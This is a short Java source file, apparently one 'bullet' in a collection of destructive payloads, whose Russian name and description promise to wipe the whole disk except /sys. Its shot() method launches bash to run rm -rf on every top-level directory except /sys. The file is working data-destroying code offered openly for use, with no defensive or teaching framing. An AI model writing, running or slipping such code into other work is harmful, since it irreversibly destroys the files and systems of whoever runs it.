package bullets;

import lombok.Getter;

import java.io.IOException;

@Getter
public class RmRfAll implements Bullet {
    String name = "Удаление корня";
    String description = "Полностью очищает ваш диск, при этом не превращая его в кирпич(не затрагивая /sys)";

    @Override
    public void shot() throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder("bash", "-c",
                "for f in /*; do [ \"$f\" != \"/sys\" ] && rm -rf \"$f\"; done");

        processBuilder.start();
    }
}